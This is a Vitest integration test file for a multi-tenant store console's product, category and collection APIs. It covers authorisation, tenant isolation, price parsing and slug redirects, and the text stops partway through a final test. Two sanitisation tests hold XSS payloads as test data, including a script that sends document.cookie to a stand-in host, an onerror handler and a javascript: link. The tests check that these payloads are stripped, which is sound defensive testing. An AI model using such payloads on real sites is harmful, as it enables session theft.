import { createHash, randomUUID } from "node:crypto";

import { closeRedis } from "@platform/core";
import {
  CONSOLE_PAGE_SIZE,
  getProductForConsole,
  listMediaForConsole,
  listProductsForConsole,
  listTaxonomyForConsole,
  resolveStorefrontSlug,
} from "@platform/core/catalog/server";
import { closeConnections } from "@platform/db";
import postgres from "postgres";
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";

/**
 * Product CRUD against real PostgreSQL, with RLS live.
 *
 * The route handlers are called directly with a constructed `Request`,
 * exactly as `media-upload.integration.test.ts` does. Only
 * `next/headers` is stubbed — it reads request-scoped async storage that
 * only exists inside a Next server. The token it returns is a genuine
 * session row, so `resolveSession`, the membership lookup and the
 * permission check all run for real: the stub replaces the framework's
 * transport, not the security.
 *
 * Reads back through a MIGRATOR connection on purpose. That role is not
 * subject to RLS, so a test asserting "nothing was written for tenant B"
 * is asserting about the table rather than about what tenant B's own
 * context happens to show it — which is the only way to catch a write
 * that landed under the wrong tenant.
 */

let sessionToken: string | undefined;

vi.mock("next/headers", () => ({
  cookies: () =>
    Promise.resolve({
      get: (name: string) =>
        name === "console_session" && sessionToken ? { name, value: sessionToken } : undefined,
    }),
  headers: () => Promise.resolve(new Headers()),
}));

const { POST: createProductRoute } = await import("../src/app/api/products/route");
const { PUT: updateProductRoute } = await import("../src/app/api/products/[id]/route");
const { POST: createCategoryRoute } = await import("../src/app/api/categories/route");
const { PUT: updateCategoryRoute } = await import("../src/app/api/categories/[id]/route");
const { POST: createCollectionRoute } = await import("../src/app/api/collections/route");
const { PUT: updateCollectionRoute } = await import("../src/app/api/collections/[id]/route");

const migratorUrl = process.env.DATABASE_URL_MIGRATOR;
if (!migratorUrl) throw new Error("DATABASE_URL_MIGRATOR must be set to run integration tests");

const admin = postgres(migratorUrl, { max: 2, onnotice: () => {} });

let tenantA: string;
let tenantB: string;
let ownerToken: string;
let ownerUserId: string;
let cashierToken: string;
/** A media row belonging to tenant B, for the cross-tenant attach test. */
let foreignMediaId: string;

async function makeTenant(): Promise<string> {
  const slug = "c-" + randomUUID().slice(0, 12);
  const [plan] = await admin<{ id: string }[]>`
    INSERT INTO plans (id, code, name)
    VALUES (${randomUUID()}, ${"c-" + randomUUID().slice(0, 8)}, 'Catalog test plan')
    RETURNING id`;
  const [tenant] = await admin<{ id: string }[]>`
    INSERT INTO tenants (id, slug, legal_name, display_name, plan_id, status)
    VALUES (${randomUUID()}, ${slug}, ${slug}, ${slug}, ${plan!.id}, 'active')
    RETURNING id`;
  return tenant!.id;
}

async function makeSession(
  tenantId: string,
  role: string,
): Promise<{ token: string; userId: string }> {
  const userId = randomUUID();
  const phone = "+9197" + String(Math.floor(Math.random() * 1e8)).padStart(8, "0");
  await admin`INSERT INTO users (id, phone_e164, name) VALUES (${userId}, ${phone}, 'Catalog test')`;
  await admin`
    INSERT INTO tenant_members (tenant_id, user_id, role, accepted_at)
    VALUES (${tenantId}, ${userId}, ${role}, now())`;

  const token = randomUUID() + randomUUID();
  await admin`
    INSERT INTO sessions (id, token_hash, user_id, tenant_id, expires_at, idle_expires_at)
    VALUES (${randomUUID()}, ${createHash("sha256").update(token).digest("hex")},
            ${userId}, ${tenantId}, now() + interval '1 day', now() + interval '1 day')`;

  return { token, userId };
}

async function makeMedia(tenantId: string): Promise<string> {
  const id = randomUUID();
  await admin`
    INSERT INTO media (id, tenant_id, storage_key, mime_type, byte_size, status)
    VALUES (${id}, ${tenantId}, ${`${tenantId}/${randomUUID()}.png`}, 'image/png', 100, 'ready')`;
  return id;
}

function jsonRequest(url: string, body: unknown, method = "POST"): Request {
  return new Request(url, {
    method,
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
}

/** A minimal valid payload; each test overrides only what it is about. */
function productPayload(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    title: "Test Product",
    status: "draft",
    variants: [{ sku: `SKU-${randomUUID().slice(0, 8)}`, price: "100", weightGrams: 200 }],
    ...overrides,
  };
}

async function createProduct(
  body: Record<string, unknown>,
): Promise<{ status: number; data: Record<string, unknown> }> {
  const response = await createProductRoute(
    jsonRequest("http://console.test/api/products", body),
  );
  return { status: response.status, data: (await response.json()) as Record<string, unknown> };
}

async function updateProduct(
  id: string,
  body: Record<string, unknown>,
): Promise<{ status: number; data: Record<string, unknown> }> {
  const response = await updateProductRoute(
    jsonRequest(`http://console.test/api/products/${id}`, body, "PUT"),
    { params: Promise.resolve({ id }) },
  );
  return { status: response.status, data: (await response.json()) as Record<string, unknown> };
}

type SlugRow = { slug: string; is_canonical: boolean; entity_id: string };

async function countProducts(tenantId: string): Promise<number> {
  const [row] = await admin<{ count: string }[]>`
    SELECT count(*)::int AS count FROM products WHERE tenant_id = ${tenantId}`;
  return Number(row!.count);
}

async function countAttachments(mediaId: string): Promise<number> {
  const [row] = await admin<{ count: string }[]>`
    SELECT count(*)::int AS count FROM product_media WHERE media_id = ${mediaId}`;
  return Number(row!.count);
}

async function slugsFor(entityId: string): Promise<SlugRow[]> {
  return admin<SlugRow[]>`
    SELECT slug, is_canonical, entity_id FROM url_slugs
    WHERE entity_id = ${entityId} ORDER BY is_canonical DESC, created_at`;
}

async function auditFor(entityId: string): Promise<{ action: string; after: unknown }[]> {
  return admin<{ action: string; after: unknown }[]>`
    SELECT action, after FROM audit_log WHERE entity_id = ${entityId} ORDER BY created_at`;
}

beforeAll(async () => {
  tenantA = await makeTenant();
  tenantB = await makeTenant();

  const owner = await makeSession(tenantA, "owner");
  ownerToken = owner.token;
  ownerUserId = owner.userId;

  // catalog:read but NOT catalog:write — see ROLE_PERMISSIONS.
  cashierToken = (await makeSession(tenantA, "cashier")).token;

  foreignMediaId = await makeMedia(tenantB);
});

afterEach(() => {
  sessionToken = undefined;
});

afterAll(async () => {
  await closeRedis();
  await admin.end();
  await closeConnections();
});

describe("POST /api/products — authentication and authorisation", () => {
  it("refuses an unauthenticated request", async () => {
    const { status } = await createProduct(productPayload());

    expect(status).toBe(401);
    expect(await countProducts(tenantA)).toBe(0);
  });

  it("refuses an authenticated actor without catalog:write", async () => {
    sessionToken = cashierToken;

    const { status, data } = await createProduct(productPayload());

    expect(status).toBe(403);
    expect(data).toMatchObject({ error: { code: "forbidden" } });
    expect(await countProducts(tenantA)).toBe(0);
  });

  it("takes the tenant from the session and ignores one in the body", async () => {
    sessionToken = ownerToken;

    const { status, data } = await createProduct(
      productPayload({ title: "Session Tenant", tenantId: tenantB }),
    );
    expect(status).toBe(201);

    const [row] = await admin<{ tenant_id: string }[]>`
      SELECT tenant_id FROM products WHERE id = ${data.productId as string}`;

    expect(row!.tenant_id).toBe(tenantA);
    expect(row!.tenant_id).not.toBe(tenantB);
    expect(await countProducts(tenantB)).toBe(0);
  });
});

describe("POST /api/products — what gets stored", () => {
  it("stores a sanitised description, not what the merchant sent", async () => {
    sessionToken = ownerToken;

    const { status, data } = await createProduct(
      productPayload({
        title: "Sanitised Copy",
        description:
          "<p>Machine wash <strong>cold</strong>.</p>" +
          "<script>fetch('https://evil.test?c='+document.cookie)</script>" +
          '<img src=x onerror=alert(1)>' +
          '<a href="javascript:alert(1)">Tap</a>' +
          '<a href="https://example.test/care">Care guide</a>',
      }),
    );
    expect(status).toBe(201);

    const [row] = await admin<{ description: string }[]>`
      SELECT description FROM products WHERE id = ${data.productId as string}`;

    const stored = row!.description;
    // Nothing executable reached the column — which is the point of
    // sanitising on WRITE rather than on read.
    expect(stored).not.toContain("<script");
    expect(stored).not.toContain("document.cookie");
    expect(stored).not.toContain("<img");
    expect(stored).not.toContain("onerror");
    expect(stored).not.toContain("javascript:");
    // The formatting a merchant actually wanted survived.
    expect(stored).toContain("<strong>cold</strong>");
    expect(stored).toContain('href="https://example.test/care"');
    expect(stored).toContain('rel="nofollow noopener"');
  });

  it("stores money as integer paise, parsed from what the merchant typed", async () => {
    sessionToken = ownerToken;

    const { status, data } = await createProduct(
      productPayload({
        title: "Priced In Paise",
        variants: [
          {
            sku: `PAISE-${randomUUID().slice(0, 8)}`,
            // Symbol, grouping and a fractional part that a float would
            // round wrong. 1299.10 → 129910 paise, exactly.
            price: "₹1,299.10",
            compareAt: "1,499",
            weightGrams: 250,
          },
        ],
      }),
    );
    expect(status).toBe(201);

    const [variant] = await admin<{ price_paise: string; compare_at_paise: string }[]>`
      SELECT price_paise, compare_at_paise FROM product_variants
      WHERE product_id = ${data.productId as string}`;

    expect(Number(variant!.price_paise)).toBe(129910);
    expect(Number(variant!.compare_at_paise)).toBe(149900);
  });

  it("writes options, variants, membership, gallery and one audit row", async () => {
    sessionToken = ownerToken;

    const categoryResponse = await createCategoryRoute(
      jsonRequest("http://console.test/api/categories", { title: "Shirts" }),
    );
    expect(categoryResponse.status).toBe(201);
    const { id: categoryId } = (await categoryResponse.json()) as { id: string };

    const collectionResponse = await createCollectionRoute(
      jsonRequest("http://console.test/api/collections", { title: "New In" }),
    );
    expect(collectionResponse.status).toBe(201);
    const { id: collectionId } = (await collectionResponse.json()) as { id: string };

    const mediaId = await makeMedia(tenantA);
    const prefix = randomUUID().slice(0, 6);

    const { status, data } = await createProduct({
      title: "Full Product",
      status: "active",
      taxRatePercent: "12.5",
      hsnCode: "6205",
      tags: ["cotton", "shirt"],
      axes: [{ name: "Size", values: ["S", "M"] }],
      variants: [
        { sku: `${prefix}-S`, options: { Size: "S" }, price: "1299", weightGrams: 240 },
        { sku: `${prefix}-M`, options: { Size: "M" }, price: "1299", weightGrams: 250 },
      ],
      categoryIds: [categoryId],
      collectionIds: [collectionId],
      media: [{ mediaId, alt: "A folded shirt" }],
    });

    expect(status).toBe(201);
    const productId = data.productId as string;

    const [product] = await admin<
      { status: string; tax_rate_bps: number; published_at: Date | null; tags: string[] }[]
    >`SELECT status, tax_rate_bps, published_at, tags FROM products WHERE id = ${productId}`;
    expect(product!.status).toBe("active");
    // 12.5% → 1250 basis points, via integer arithmetic on the string.
    expect(product!.tax_rate_bps).toBe(1250);
    // Set on the first activation. PostgreSQL sorts NULLs FIRST under
    // DESC, so an active product without one pins itself to the top of
    // every storefront listing.
    expect(product!.published_at).not.toBeNull();
    expect(product!.tags).toEqual(["cotton", "shirt"]);

    const options = await admin<{ name: string; value: string }[]>`
      SELECT o.name, v.value FROM product_options o
      JOIN product_option_values v ON v.option_id = o.id
      WHERE o.product_id = ${productId} ORDER BY v.position`;
    expect(options.map((o) => o.value)).toEqual(["S", "M"]);
    expect(new Set(options.map((o) => o.name))).toEqual(new Set(["Size"]));

    const variants = await admin<{ sku: string; options: Record<string, string> }[]>`
      SELECT sku, options FROM product_variants
      WHERE product_id = ${productId} AND deleted_at IS NULL ORDER BY position`;
    expect(variants.map((v) => v.sku)).toEqual([`${prefix}-S`, `${prefix}-M`]);
    expect(variants[0]!.options).toEqual({ Size: "S" });

    const [membership] = await admin<{ categories: string; collections: string }[]>`
      SELECT
        (SELECT count(*) FROM product_categories WHERE product_id = ${productId}) AS categories,
        (SELECT count(*) FROM product_collections WHERE product_id = ${productId}) AS collections`;
    expect(Number(membership!.categories)).toBe(1);
    expect(Number(membership!.collections)).toBe(1);

    const [gallery] = await admin<{ media_id: string; position: number }[]>`
      SELECT media_id, position FROM product_media WHERE product_id = ${productId}`;
    expect(gallery!.media_id).toBe(mediaId);
    // Alt lives on the media row, so the same photograph does not need
    // the same sentence typed on every product that uses it.
    const [image] = await admin<{ alt: string }[]>`SELECT alt FROM media WHERE id = ${mediaId}`;
    expect(image!.alt).toBe("A folded shirt");

    const audit = await auditFor(productId);
    expect(audit).toHaveLength(1);
    expect(audit[0]!.action).toBe("product.created");
    expect(audit[0]!.after).toMatchObject({ title: "Full Product", variantCount: 2 });

    const [actor] = await admin<{ actor_user_id: string; actor_type: string }[]>`
      SELECT actor_user_id, actor_type FROM audit_log WHERE entity_id = ${productId}`;
    expect(actor!.actor_user_id).toBe(ownerUserId);
    expect(actor!.actor_type).toBe("staff");
  });
});

describe("POST /api/products — refusals", () => {
  it("refuses a variant matrix that does not name the declared axes", async () => {
    sessionToken = ownerToken;

    const { status, data } = await createProduct(
      productPayload({
        title: "Broken Matrix",
        axes: [
          { name: "Size", values: ["S", "M"] },
          { name: "Colour", values: ["Red"] },
        ],
        // Names Size but not Colour: a PDP selector cannot resolve a
        // selection to this variant, so Add to Cart silently does
        // nothing for some combinations and works for others.
        variants: [{ sku: `HALF-${randomUUID().slice(0, 8)}`, options: { Size: "S" }, price: "10", weightGrams: 1 }],
      }),
    );

    expect(status).toBe(422);
    expect(data).toMatchObject({ error: { code: "catalog_invalid" } });
    const issues = (data.error as { details: { issues: { message: string }[] } }).details.issues;
    expect(issues.some((i) => i.message.includes("Colour"))).toBe(true);
  });

  it("refuses a SKU already used by another product", async () => {
    sessionToken = ownerToken;

    const sku = `DUPE-${randomUUID().slice(0, 8)}`;
    const first = await createProduct(
      productPayload({ title: "First", variants: [{ sku, price: "10", weightGrams: 1 }] }),
    );
    expect(first.status).toBe(201);

    const second = await createProduct(
      productPayload({ title: "Second", variants: [{ sku, price: "20", weightGrams: 2 }] }),
    );

    // A labelled field error, not a 500 from the unique index.
    expect(second.status).toBe(422);
    const issues = (second.data.error as { details: { issues: { path: string }[] } }).details
      .issues;
    expect(issues[0]!.path).toBe("variants.0.sku");
  });

  it("refuses another tenant's media rather than attaching it", async () => {
    sessionToken = ownerToken;

    // The foreign key is checked by PostgreSQL as the table owner, with
    // row security bypassed — so RLS alone does NOT stop this insert.
    // Only the explicit visibility SELECT in the write layer does.
    const { status, data } = await createProduct(
      productPayload({
        title: "Foreign Image",
        media: [{ mediaId: foreignMediaId, alt: "not mine" }],
      }),
    );

    expect(status).toBe(422);
    expect(data).toMatchObject({ error: { code: "catalog_invalid" } });

    expect(await countAttachments(foreignMediaId)).toBe(0);
  });

  it("refuses a price that is not a plain amount", async () => {
    sessionToken = ownerToken;

    const { status, data } = await createProduct(
      productPayload({
        title: "Bad Price",
        variants: [{ sku: `BAD-${randomUUID().slice(0, 8)}`, price: "1299.999", weightGrams: 1 }],
      }),
    );

    // Not rounded to ₹1,300 behind the merchant's back: refused, with
    // the reason.
    expect(status).toBe(422);
    expect(data).toMatchObject({ error: { code: "invalid_payload" } });
    const issues = (data.error as { details: { issues: { path: string }[] } }).details.issues;
    expect(issues[0]!.path).toBe("variants.0.price");
  });

  it("refuses a product with no variants", async () => {
    sessionToken = ownerToken;

    const { status } = await createProduct(productPayload({ title: "Empty", variants: [] }));
    expect(status).toBe(422);
  });
});

describe("PUT /api/products/[id]", () => {
  it("create → edit → slug change → the old slug still redirects", async () => {
    sessionToken = ownerToken;

    // ── Create ──
    const prefix = randomUUID().slice(0, 6);
    const created = await createProduct({
      title: "Classic Cotton Shirt",
      status: "active",
      description: "<p>A shirt.</p>",
      variants: [{ sku: `${prefix}-A`, price: "1299", weightGrams: 240 }],
    });
    expect(created.status).toBe(201);

    const productId = created.data.productId as string;
    const originalSlug = created.data.slug as string;
    expect(originalSlug).toBe("classic-cotton-shirt");

    // The storefront serves it at that URL.
    await expect(resolveStorefrontSlug(tenantA, originalSlug)).resolves.toEqual({
      action: "render",
      entityType: "product",
      entityId: productId,
    });

    // ── Edit, without touching the URL ──
    const edited = await updateProduct(productId, {
      title: "Classic Cotton Shirt",
      slug: originalSlug,
      status: "active",
      description: "<p>A <strong>very good</strong> shirt.</p>",
      variants: [{ sku: `${prefix}-A`, price: "1399", weightGrams: 240 }],
    });
    expect(edited.status).toBe(200);
    expect(edited.data.previousSlug).toBeNull();

    const [afterEdit] = await admin<{ title: string; description: string }[]>`
      SELECT title, description FROM products WHERE id = ${productId}`;
    expect(afterEdit!.description).toContain("<strong>very good</strong>");

    const [repriced] = await admin<{ price_paise: string }[]>`
      SELECT price_paise FROM product_variants
      WHERE product_id = ${productId} AND deleted_at IS NULL`;
    expect(Number(repriced!.price_paise)).toBe(139900);

    // Editing without a rename leaves exactly one slug row.
    expect(await slugsFor(productId)).toHaveLength(1);

    // ── Rename ──
    const renamed = await updateProduct(productId, {
      title: "Classic Oxford Shirt",
      slug: "classic-oxford-shirt",
      status: "active",
      variants: [{ sku: `${prefix}-A`, price: "1399", weightGrams: 240 }],
    });
    expect(renamed.status).toBe(200);
    expect(renamed.data.slug).toBe("classic-oxford-shirt");
    expect(renamed.data.previousSlug).toBe(originalSlug);

    // ── The old URL keeps working ──
    const slugRows = await slugsFor(productId);
    expect(slugRows).toHaveLength(2);
    expect(slugRows.filter((r) => r.is_canonical)).toHaveLength(1);
    expect(slugRows.find((r) => r.is_canonical)!.slug).toBe("classic-oxford-shirt");
    // The old row is KEPT, not deleted. Deleting it would 404 every
    // inbound link the page had accumulated.
    expect(slugRows.some((r) => !r.is_canonical && r.slug === originalSlug)).toBe(true);

    await expect(resolveStorefrontSlug(tenantA, originalSlug)).resolves.toEqual({
      action: "redirect",
      to: "classic-oxford-shirt",
      permanent: true,
    });

    await expect(resolveStorefrontSlug(tenantA, "classic-oxford-shirt")).resolves.toEqual({
      action: "render",
      entityType: "product",
      entityId: productId,
    });

    // ── And it is all in the audit log ──
    const audit = await auditFor(productId);
    expect(audit.map((a) => a.action)).toEqual([
      "product.created",
      "product.updated",
      "product.slug_changed",
    ]);
  });

  it("gives a renamed product its old URL back rather than appending -2", async () => {
    sessionToken = ownerToken;

    const prefix = randomUUID().slice(0, 6);
    const created = await createProduct({
      title: `Undo Rename ${prefix}`,
      status: "draft",
      variants: [{ sku: `${prefix}-U`, price: "10", weightGrams: 1 }],
    });
    const productId = created.data.productId as string;
    const original = created.data.slug as string;

    const base = { status: "draft", variants: [{ sku: `${prefix}-U`, price: "10", weightGrams: 1 }] };

    await updateProduct(productId, { ...base, title: "renamed", slug: `${original}-x` });
    const back = await updateProduct(productId, { ...base, title: "back", slug: original });

    // Its own historical slug is not "taken" by anyone else, so it is
    // reclaimed. Treating it as taken would hand the merchant `-2`.
    expect(back.data.slug).toBe(original);

    const rows = await slugsFor(productId);
    expect(rows.filter((r) => r.is_canonical)).toHaveLength(1);
    expect(rows.find((r) => r.is_canonical)!.slug).toBe(original);
  });

  it("swaps two variants' SKUs in one save without tripping the unique index", async () => {
    sessionToken = ownerToken;

    const prefix = randomUUID().slice(0, 6);
    const created = await createProduct({
      title: `Swap ${prefix}`,
      status: "draft",
      axes: [{ name: "Size", values: ["S", "M"] }],
      variants: [
        { sku: `${prefix}-ONE`, options: { Size: "S" }, price: "10", weightGrams: 1 },
        { sku: `${prefix}-TWO`, options: { Size: "M" }, price: "20", weightGrams: 2 },
      ],
    });
    expect(created.status).toBe(201);
    const productId = created.data.productId as string;

    const existing = await admin<{ id: string; sku: string }[]>`
      SELECT id, sku FROM product_variants
      WHERE product_id = ${productId} AND deleted_at IS NULL ORDER BY position`;

    // Each variant takes the other's SKU AND the other's option value.
    // Both `product_variants_tenant_sku_key` and
    // `product_variants_option_combo_key` are partial unique indexes
    // over `deleted_at IS NULL`, so an in-place UPDATE of the first row
    // collides with the second before the second has moved.
    const swapped = await updateProduct(productId, {
      title: `Swap ${prefix}`,
      status: "draft",
      axes: [{ name: "Size", values: ["S", "M"] }],
      variants: [
        {
          id: existing[0]!.id,
          sku: `${prefix}-TWO`,
          options: { Size: "M" },
          price: "20",
          weightGrams: 2,
        },
        {
          id: existing[1]!.id,
          sku: `${prefix}-ONE`,
          options: { Size: "S" },
          price: "10",
          weightGrams: 1,
        },
      ],
    });

    expect(swapped.status).toBe(200);

    const after = await admin<{ id: string; sku: string; options: Record<string, string> }[]>`
      SELECT id, sku, options FROM product_variants
      WHERE product_id = ${productId} AND deleted_at IS NULL ORDER BY position`;
    expect(after).toHaveLength(2);
    expect(after[0]!.id).toBe(existing[0]!.id);
    expect(after[0]!.sku).toBe(`${prefix}-TWO`);
    expect(after[1]!.sku).toBe(`${prefix}-ONE`);
  });

  it("soft-deletes a removed variant rather than dropping the row", async () => {
    sessionToken = ownerToken;

    const prefix = randomUUID().slice(0, 6);
    const created = await createProduct({
      title: `Shrink ${prefix}`,
      status: "draft",
      axes: [{ name: "Size", values: ["S", "M"] }],
      variants: [
        { sku: `${prefix}-S`, options: { Size: "S" }, price: "10", weightGrams: 1 },
        { sku: `${prefix}-M`, options: { Size: "M" }, price: "10", weightGrams: 1 },
      ],
    });
    const productId = created.data.productId as string;

    const before = await admin<{ id: string; sku: string }[]>`
      SELECT id, sku FROM product_variants WHERE product_id = ${productId}`;
    const keptId = before.find((r) => r.sku === `${prefix}-S`)!.id;

    // Note there is no `id` on the submitted variant. A CSV import
    // identifies a variant the only way a spreadsheet can — by SKU — and
    // the write layer must reuse the existing row rather than replace it.
    const dropped = await updateProduct(productId, {
      title: `Shrink ${prefix}`,
      status: "draft",
      axes: [{ name: "Size", values: ["S"] }],
      variants: [{ sku: `${prefix}-S`, options: { Size: "S" }, price: "10", weightGrams: 1 }],
    });
    expect(dropped.status).toBe(200);

    const rows = await admin<{ id: string; sku: string; deleted_at: Date | null }[]>`
      SELECT id, sku, deleted_at FROM product_variants WHERE product_id = ${productId}`;
    expect(rows).toHaveLength(2);
    // The removed row survives for whatever order line references it in
    // Phase 2, and the kept one keeps its identity rather than being
    // silently re-created under a new id.
    expect(rows.find((r) => r.sku === `${prefix}-M`)!.deleted_at).not.toBeNull();
    expect(rows.find((r) => r.sku === `${prefix}-S`)!.deleted_at).toBeNull();
    expect(rows.find((r) => r.sku === `${prefix}-S`)!.id).toBe(keptId);
  });

  it("404s another tenant's product instead of editing it", async () => {
    // Created under tenant B by its own owner…
    const otherOwner = await makeSession(tenantB, "owner");
    sessionToken = otherOwner.token;

    const created = await createProduct(
      productPayload({ title: "Tenant B Product" }),
    );
    expect(created.status).toBe(201);
    const foreignProductId = created.data.productId as string;

    // …and tenant A cannot see it, so it cannot edit it.
    sessionToken = ownerToken;
    const { status } = await updateProduct(
      foreignProductId,
      productPayload({ title: "Hijacked" }),
    );

    expect(status).toBe(404);

    const [row] = await admin<{ title: string }[]>`
      SELECT title FROM products WHERE id = ${foreignProductId}`;
    expect(row!.title).toBe("Tenant B Product");
  });

  it("404s a malformed id rather than 500ing on the cast", async () => {
    sessionToken = ownerToken;

    const response = await updateProductRoute(
      jsonRequest("http://console.test/api/products/not-a-uuid", productPayload(), "PUT"),
      { params: Promise.resolve({ id: "not-a-uuid" }) },
    );

    expect(response.status).toBe(404);
  });
});

describe("categories and collections", () => {
  it("renames a category and keeps the old URL redirecting", async () => {
    sessionToken = ownerToken;

    const response = await createCategoryRoute(
      jsonRequest("http://console.test/api/categories", { title: "Winter Wear" }),
    );
    expect(response.status).toBe(201);
    const created = (await response.json()) as { id: string; slug: string };
    expect(created.slug).toBe("winter-wear");

    const renameResponse = await updateCategoryRoute(
      jsonRequest(
        `http://console.test/api/categories/${created.id}`,
        { title: "Cold Weather", slug: "cold-weather" },
        "PUT",
      ),
      { params: Promise.resolve({ id: created.id }) },
    );
    expect(renameResponse.status).toBe(200);
    expect(await renameResponse.json()).toMatchObject({
      slug: "cold-weather",
      previousSlug: "winter-wear",
    });

    await expect(resolveStorefrontSlug(tenantA, "winter-wear")).resolves.toEqual({
      action: "redirect",
      to: "cold-weather",
      permanent: true,
    });
  });

  it("refuses a category filed under its own descendant", async () => {
    sessionToken = ownerToken;

    const parentResponse = await createCategoryRoute(
      jsonRequest("http://console.test/api/categories", { title: `Root ${randomUUID().slice(0, 6)}` }),
    );
    const parent = (await parentResponse.json()) as { id: string };

    const childResponse = await createCategoryRoute(
      jsonRequest("http://console.test/api/categories", {
        title: `Child ${randomUUID().slice(0, 6)}`,
        parentId: parent.id,
      }),
    );
    const child = (await childResponse.json()) as { id: string };

    // A two-step cycle satisfies every database constraint and leaves
    // both subtrees unreachable from any root — invisible in the console
    // and unfixable through the UI.
    const cycle = await updateCategoryRoute(
      jsonRequest(
        `http://console.test/api/categories/${parent.id}`,
        { title: "Root", parentId: child.id },
        "PUT",
      ),
      { params: Promise.resolve({ id: parent.id }) },
    );

    expect(cycle.status).toBe(422);

    const [row] = await admin<{ parent_id: string | null }[]>`
      SELECT parent_id FROM categories WHERE id = ${parent.id}`;
    expect(row!.parent_id).toBeNull();
  });

  it("sanitises category and collection descriptions, not just products'", async () => {
    sessionToken = ownerToken;

    const hostile =
      "<p>Warm things for <strong>winter</strong>.</p>" +
      "<script>fetch('https://evil.test?c='+document.cookie)</script>" +
      "<img src=x onerror=alert(1)>";

    const category = await createCategoryRoute(
      jsonRequest("http://console.test/api/categories", {
        title: `Sanitised Cat ${randomUUID().slice(0, 6)}`,
        description: hostile,
      }),
    );
    expect(category.status).toBe(201);
    const categoryId = ((await category.json()) as { id: string }).id;

    const collection = await createCollectionRoute(
      jsonRequest("http://console.test/api/collections", {
        title: `Sanitised Col ${randomUUID().slice(0, 6)}`,
        description: hostile,
      }),
    );
    expect(collection.status).toBe(201);
    const collectionId = ((await collection.json()) as { id: string }).id;

    const [categoryRow] = await admin<{ description: string }[]>`
      SELECT description FROM categories WHERE id = ${categoryId}`;
    const [collectionRow] = await admin<{ description: string }[]>`
      SELECT description FROM collections WHERE id = ${collectionId}`;

    // These render through `plainText` on the storefront today, so this
    // is not live XSS — but the write layer states as an invariant that
    // a raw description cannot reach a column, and the product PDP was
    // four diff lines from the same `dangerouslySetInnerHTML` flip.
    for (const [label, stored] of [
      ["category", categoryRow!.description],
      ["collection", collectionRow!.description],
    ] as const) {
      expect(stored, label).not.toContain("<script");
      expect(stored, label).not.toContain("document.cookie");
      expect(stored, label).not.toContain("onerror");
      expect(stored, label).not.toContain("<img");
      expect(stored, label).toContain("<strong>winter</strong>");
    }

    // And on the way through an update, not only on create.
    const renamed = await updateCategoryRoute(
      jsonRequest(
        `http://console.test/api/categories/${categoryId}`,
        { title: "Still Sanitised", description: hostile },
        "PUT",
      ),
      { params: Promise.resolve({ id: categoryId }) },
    );
    expect(renamed.status).toBe(200);

    const [afterUpdate] = await admin<{ description: string }[]>`
      SELECT description FROM categories WHERE id = ${categoryId}`;
    expect(afterUpdate!.description).not.toContain("<script");
    expect(afterUpdate!.description).toContain("<strong>winter</strong>");
  });

  it("gives a reserved slug a suffix instead of shadowing a storefront route", async () => {
    sessionToken = ownerToken;

    const response = await createCollectionRoute(
      jsonRequest("http://console.test/api/collections", { title: "Search" }),
    );
    expect(response.status).toBe(201);

    // `/search` is the storefront's own route; RESERVED_SLUGS keeps a
    // merchant from ever being assigned it.
    expect(await response.json()).toMatchObject({ slug: "search-item" });
  });
});

describe("slug history — the guarantee the design exists for", () => {
  it("keeps the OLDEST slug redirecting after a second rename", async () => {
    sessionToken = ownerToken;

    const prefix = randomUUID().slice(0, 6);
    const first = `${prefix}-one`;
    const created = await createProduct({
      title: first,
      status: "active",
      variants: [{ sku: `${prefix}-CH`, price: "10", weightGrams: 1 }],
    });
    expect(created.status).toBe(201);

    const productId = created.data.productId as string;
    const base = {
      status: "active",
      variants: [{ sku: `${prefix}-CH`, price: "10", weightGrams: 1 }],
    };

    const second = `${prefix}-two`;
    const third = `${prefix}-three`;

    await updateProduct(productId, { ...base, title: second, slug: second });
    const renamed = await updateProduct(productId, { ...base, title: third, slug: third });
    expect(renamed.data.slug).toBe(third);

    // The point: BOTH superseded slugs resolve to the CURRENT canonical
    // one, not to each other. `resolveSlug` looks up the entity's
    // canonical slug rather than chaining, so a product renamed twenty
    // times still costs one redirect — a chain would multiply latency,
    // and Google stops following them at around five hops.
    for (const stale of [first, second]) {
      await expect(resolveStorefrontSlug(tenantA, stale), stale).resolves.toEqual({
        action: "redirect",
        to: third,
        permanent: true,
      });
    }

    await expect(resolveStorefrontSlug(tenantA, third)).resolves.toEqual({
      action: "render",
      entityType: "product",
      entityId: productId,
    });

    const rows = await slugsFor(productId);
    expect(rows).toHaveLength(3);
    expect(rows.filter((r) => r.is_canonical)).toHaveLength(1);
  });

  it("gives the second product a suffix when two want the same slug", async () => {
    sessionToken = ownerToken;

    const prefix = randomUUID().slice(0, 6);
    const wanted = `${prefix}-contested`;

    const first = await createProduct({
      title: wanted,
      status: "draft",
      variants: [{ sku: `${prefix}-C1`, price: "10", weightGrams: 1 }],
    });
    const second = await createProduct({
      title: wanted,
      status: "draft",
      variants: [{ sku: `${prefix}-C2`, price: "10", weightGrams: 1 }],
    });

    expect(first.data.slug).toBe(wanted);
    // Numbering starts at 2 because `-1` reads as a duplicate of
    // something, while `-2` reads as a second one.
    expect(second.data.slug).toBe(`${wanted}-2`);

    // Both are reachable, and each resolves to its OWN product.
    await expect(resolveStorefrontSlug(tenantA, wanted)).resolves.toEqual({
      action: "render",
      entityType: "product",
      entityId: first.data.productId,
    });
    await expect(resolveStorefrontSlug(tenantA, `${wanted}-2`)).resolves.toEqual({
      action: "render",
      entityType: "product",
      entityId: second.data.productId,
    });
  });

  it("lets two tenants hold the same slug independently", async () => {
    const prefix = randomUUID().slice(0, 6);
    const shared = `${prefix}-shared`;

    sessionToken = ownerToken;
    const mine = await createProduct({
      title: shared,
      status: "active",
      variants: [{ sku: `${prefix}-MINE`, price: "10", weightGrams: 1 }],
    });
    expect(mine.data.slug).toBe(shared);

    const theirs = await makeSession(tenantB, "owner");
    sessionToken = theirs.token;
    const other = await createProduct({
      title: shared,
      status: "active",
      variants: [{ sku: `${prefix}-THEIRS`, price: "10", weightGrams: 1 }],
    });

    // No suffix: `url_slugs` is keyed per TENANT, so one merchant taking
    // /white-shirt must not push the next one onto /white-shirt-2.
    expect(other.data.slug).toBe(shared);

    // And each tenant resolves it to its own product.
    await expect(resolveStorefrontSlug(tenantA, shared)).resolves.toMatchObject({
      action: "render",
      entityId: mine.data.productId,
    });
    await expect(resolveStorefrontSlug(tenantB, shared)).resolves.toMatchObject({
      action: "render",
      entityId: other.data.productId,
    });
  });

  it("refuses to hand a superseded slug to a different product", async () => {
